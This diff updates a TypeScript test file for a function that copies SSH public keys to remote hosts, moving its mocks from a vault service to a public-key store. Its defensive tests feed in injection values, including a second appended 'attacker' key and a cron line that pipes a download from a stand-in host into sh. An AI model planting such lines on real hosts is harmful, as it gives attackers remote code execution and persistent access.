@@ -3,13 +3,15 @@ import { addKeyToHost, DEFAULT_EXPORT_SCRIPT } from "./keyExport";
 
 const PUB_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHqW1p3nMuFvR5NHqhkxLQKfDVZ2VYFOxKvL8dW7dSpq user@host";
 
-const getSecret = vi.fn(async (..._a: unknown[]) => `${PUB_KEY}\n`);
+const ensurePublicKey = vi.fn(async (..._a: unknown[]): Promise<string | null> => `${PUB_KEY}\n`);
 const sshExecCommand = vi.fn(async (..._a: unknown[]) => ({ stdout: "", stderr: "", exit_code: 0 }));
 const resolveConnectionCredentials = vi.fn(async (..._a: unknown[]) => ({
   username: "root", password: undefined, privateKey: "pk", passphrase: undefined,
 }));
 
-vi.mock("@/services/vault", () => ({ getSecret: (...a: unknown[]) => getSecret(...a) }));
+vi.mock("@/services/publicKeyStore", () => ({
+  ensurePublicKey: (...a: unknown[]) => ensurePublicKey(...a),
+}));
 vi.mock("@/services/ssh", () => ({ sshExecCommand: (...a: unknown[]) => sshExecCommand(...a) }));
 vi.mock("@/services/credentials", () => ({
   resolveConnectionCredentials: (...a: unknown[]) => resolveConnectionCredentials(...a),
@@ -21,10 +23,9 @@ const connection = { id: "c1", host: "example.test", port: 22 } as any;
 beforeEach(() => vi.clearAllMocks());
 
 describe("addKeyToHost", () => {
-  it("reads the key's public half, not its private one", async () => {
+  it("goes through the store, so a key imported private-only still deploys", async () => {
     await addKeyToHost({ sshKey, connection });
-    expect(getSecret).toHaveBeenCalledWith("key:k1:public");
-    expect(getSecret).not.toHaveBeenCalledWith("key:k1:private");
+    expect(ensurePublicKey).toHaveBeenCalledWith(sshKey);
   });
 
   it("defaults to .ssh/authorized_keys", async () => {
@@ -54,8 +55,8 @@ describe("addKeyToHost", () => {
     }));
   });
 
-  it("throws when the public key is missing", async () => {
-    getSecret.mockResolvedValueOnce("" as never);
+  it("throws when the public key is missing and cannot be derived", async () => {
+    ensurePublicKey.mockResolvedValueOnce(null);
     await expect(addKeyToHost({ sshKey, connection })).rejects.toThrow();
     expect(sshExecCommand).not.toHaveBeenCalled();
   });
@@ -93,7 +94,7 @@ describe("addKeyToHost", () => {
   });
 
   it("throws on a multi-line public key instead of shipping it, and never calls sshExecCommand", async () => {
-    getSecret.mockResolvedValueOnce(`${PUB_KEY}\nssh-ed25519 AAAAB3attacker` as never);
+    ensurePublicKey.mockResolvedValueOnce(`${PUB_KEY}\nssh-ed25519 AAAAB3attacker`);
     await expect(addKeyToHost({ sshKey, connection })).rejects.toThrow();
     expect(sshExecCommand).not.toHaveBeenCalled();
   });
@@ -109,7 +110,7 @@ describe("addKeyToHost", () => {
   it("throws on a public key that is not one, so it cannot be written to the remote file", async () => {
     // key_add_to_host's script supplies the line break itself, so one line of
     // attacker-chosen content is a working cron entry or shell rc line.
-    getSecret.mockResolvedValueOnce("* * * * * root curl http://evil/x|sh" as never);
+    ensurePublicKey.mockResolvedValueOnce("* * * * * root curl http://evil/x|sh");
     await expect(addKeyToHost({ sshKey, connection })).rejects.toThrow();
     expect(sshExecCommand).not.toHaveBeenCalled();
   });
